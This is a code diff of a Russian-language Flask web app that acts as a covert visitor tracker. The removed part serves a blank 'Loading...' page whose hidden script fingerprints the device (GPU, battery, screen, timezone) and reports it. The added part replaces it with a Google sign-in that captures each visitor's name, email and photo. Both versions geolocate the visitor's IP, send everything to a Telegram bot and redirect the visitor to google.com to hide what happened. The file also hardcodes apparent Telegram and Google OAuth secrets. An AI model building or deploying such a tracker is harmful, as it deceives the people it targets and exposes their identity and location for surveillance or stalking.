@@ -1,12 +1,19 @@
 from datetime import datetime
 import os
-from flask import Flask, jsonify, render_template_string, request
+from flask import Flask, redirect, render_template_string, request, session, url_for
 import requests
 
 app = Flask(__name__)
+app.secret_key = os.urandom(24)
 
 TELEGRAM_BOT_TOKEN = "8694192081:AAHOX9HIqNuYPt1hhq9Ua9d4SDS6mJ0s0tw"
 TELEGRAM_CHAT_ID = "8564758689"
+
+GOOGLE_CLIENT_ID = (
+    "23197192099-5ik0d5n4cb58leaikc44bernhmq1mgb0.apps.googleusercontent.com"
+)
+GOOGLE_CLIENT_SECRET = "GOCSPX-m5i6R60TMDK_dGUK9y7c115fN0"
+RENDER_URL = "https://photo-2pii.onrender.com"
 
 
 def send_telegram_message(text):
@@ -18,89 +25,58 @@ def send_telegram_message(text):
     print(f"Ошибка отправки текста: {e}")
 
 
-HTML_PAGE = """
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-    <meta charset="UTF-8">
-    <title>Loading...</title>
-</head>
-<body>
-    <script>
-        async function gatherData() {
-            let batteryLevel = 'Недоступно';
-            let batteryCharging = 'Неизвестно';
-            try {
-                if (navigator.getBattery) {
-                    const b = await navigator.getBattery();
-                    batteryLevel = Math.round(b.level * 100) + '%';
-                    batteryCharging = b.charging ? 'Да' : 'Нет';
-                }
-            } catch(e) {}
-
-            let glVendor = 'Неизвестно';
-            let glRenderer = 'Неизвестно';
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                    if (debugInfo) {
-                        glVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-                        glRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-                    }
-                }
-            } catch(e) {}
-
-            const data = {
-                screenResolution: window.screen.width + "x" + window.screen.height,
-                availResolution: window.screen.availWidth + "x" + window.screen.availHeight,
-                colorDepth: window.screen.colorDepth + "-bit",
-                pixelRatio: window.devicePixelRatio || 1,
-                orientation: (screen.orientation || {}).type || 'Не определена',
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                language: navigator.language || navigator.userLanguage,
-                languages: (navigator.languages || []).join(', '),
-                platform: navigator.platform,
-                hardwareConcurrency: navigator.hardwareConcurrency || 'Неизвестно',
-                deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + ' ГБ' : 'Неизвестно',
-                maxTouchPoints: navigator.maxTouchPoints || 0,
-                cookiesEnabled: navigator.cookieEnabled ? 'Да' : 'Нет',
-                onLine: navigator.onLine ? 'Да' : 'Нет',
-                batteryLevel: batteryLevel,
-                batteryCharging: batteryCharging,
-                gpuVendor: glVendor,
-                gpuRenderer: glRenderer
-            };
-
-            fetch('/collect', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(data)
-            }).then(() => {
-                window.location.href = "https://google.com";
-            }).catch(() => {
-                window.location.href = "https://google.com";
-            });
-        }
-        gatherData();
-    </script>
-</body>
-</html>
-"""
-
-
 @app.route("/")
 def index():
   user_agent = request.headers.get("User-Agent", "")
   if "Go-http-client" in user_agent or "Render" in user_agent:
     return "OK", 200
-  return render_template_string(HTML_PAGE)
+
+  redirect_uri = f"{RENDER_URL}/callback"
+  google_auth_url = (
+      f"https://accounts.google.com/o/oauth2/v2/auth?"
+      f"client_id={GOOGLE_CLIENT_ID}&"
+      f"redirect_uri={redirect_uri}&"
+      f"response_type=code&"
+      f"scope=email%20profile"
+  )
+
+  return redirect(google_auth_url)
 
 
-@app.route("/collect", methods=["POST"])
-def collect():
-  client_data = request.json or {}
+@app.route("/callback")
+def callback():
+  code = request.args.get("code")
+  if not code:
+    return "Ошибка авторизации", 400
+
+  redirect_uri = f"{RENDER_URL}/callback"
+
+  token_url = "https://oauth2.googleapis.com/token"
+  token_data = {
+      "code": code,
+      "client_id": GOOGLE_CLIENT_ID,
+      "client_secret": GOOGLE_CLIENT_SECRET,
+      "redirect_uri": redirect_uri,
+      "grant_type": "authorization_code",
+  }
+
+  token_r = requests.post(token_url, data=token_data)
+  if token_r.status_code != 200:
+    return "Ошибка получения токена", 400
+
+  access_token = token_r.json().get("access_token")
+
+  user_info_url = "https://www.googleapis.com/oauth2/v2/userinfo"
+  headers = {"Authorization": f"Bearer {access_token}"}
+  user_r = requests.get(user_info_url, headers=headers)
+
+  if user_r.status_code != 200:
+    return "Ошибка получения профиля", 400
+
+  user_info = user_r.json()
+  email = user_info.get("email", "Не указана")
+  name = user_info.get("name", "Не указано")
+  picture = user_info.get("picture", "Нет фото")
 
   ip = request.headers.get(
       "X-Forwarded-For", request.headers.get("X-Real-IP", request.remote_addr)
@@ -109,13 +85,11 @@ def collect():
     ip = ip.split(",")[0].strip()
 
   visit_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-  user_agent = request.headers.get("User-Agent", "Не определен")
-  referer = request.referrer or "Прямой переход"
 
   geo_info = {}
   try:
     geo_resp = requests.get(
-        f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,as,lat,lon,timezone,proxy",
+        f"http://ip-api.com/json/{ip}?fields=status,country,city,isp,proxy",
         timeout=3,
     )
     if geo_resp.status_code == 200:
@@ -124,46 +98,24 @@ def collect():
     pass
 
   country = geo_info.get("country", "Не определено")
-  region = geo_info.get("regionName", "Не определено")
   city = geo_info.get("city", "Не определено")
   isp = geo_info.get("isp", "Не определено")
-  org = geo_info.get("org", "Не определено")
-  lat = geo_info.get("lat", "Н/Д")
-  lon = geo_info.get("lon", "Н/Д")
-  is_vpn = "Да" if geo_info.get("proxy") else "Нет / Неизвестно"
+  is_vpn = "Да" if geo_info.get("proxy") else "Нет"
 
   message_text = (
-      f"🔔 *МАКСИМАЛЬНЫЙ ОТЧЕТ О ПЕРЕХОДЕ*\n\n"
+      f"🔑 *ВХОД ЧЕРЕЗ GOOGLE*\n\n"
+      f"👤 *Имя:* `{name}`\n"
+      f"📧 *Email:* `{email}`\n"
+      f"🖼 *Аватар:* [Фото профиля]({picture})\n\n"
       f"⏱ *Время:* `{visit_time}`\n"
-      f"🌐 *IP-адрес:* `{ip}`\n"
-      f"🛡 *VPN / Прокси:* `{is_vpn}`\n"
-      f"🔗 *Реферер:* `{referer}`\n\n"
-      f"*📍 ГЕОЛОКАЦИЯ:*\n"
-      f"• Страна: `{country}`\n"
-      f"• Регион: `{region}`\n"
-      f"• Город: `{city}`\n"
-      f"• Координаты: `{lat}, {lon}`\n"
-      f"• Провайдер: `{isp}`\n"
-      f"• Организация: `{org}`\n\n"
-      f"*💻 ЖЕЛЕЗО И ЭКРАН:*\n"
-      f"• Платформа ОС: `{client_data.get('platform', 'Н/Д')}`\n"
-      f"• Экран: `{client_data.get('screenResolution', 'Н/Д')}` (Доступно: `{client_data.get('availResolution', 'Н/Д')}`)\n"
-      f"• Плотность пикселей: `{client_data.get('pixelRatio', 'Н/Д')}`\n"
-      f"• Точки касания (Тач): `{client_data.get('maxTouchPoints', '0')}`\n"
-      f"• Ядра процессора: `{client_data.get('hardwareConcurrency', 'Н/Д')}`\n"
-      f"• Оперативная память: `{client_data.get('deviceMemory', 'Н/Д')}`\n"
-      f"• Видеокарта (GPU): `{client_data.get('gpuRenderer', 'Н/Д')}`\n\n"
-      f"*⚙ СИСТЕМА И БАТАРЕЯ:*\n"
-      f"• Язык: `{client_data.get('language', 'Н/Д')}`\n"
-      f"• Часовой пояс: `{client_data.get('timezone', 'Н/Д')}`\n"
-      f"• Батарея: `{client_data.get('batteryLevel', 'Н/Д')} (Зарядка: {client_data.get('batteryCharging', 'Н/Д')})`\n"
-      f"• Cookies: `{client_data.get('cookiesEnabled', 'Н/Д')}` | Онлайн: `{client_data.get('onLine', 'Н/Д')}`\n\n"
-      f"*🌐 USER-AGENT:*\n`{user_agent}`"
+      f"🌐 *IP:* `{ip}` (VPN: {is_vpn})\n"
+      f"📍 *Место:* `{country}, {city}`\n"
+      f"🏢 *Провайдер:* `{isp}`"
   )
 
   send_telegram_message(message_text)
 
-  return jsonify({"status": "ok"})
+  return redirect("https://google.com")
 
 
 if __name__ == "__main__":
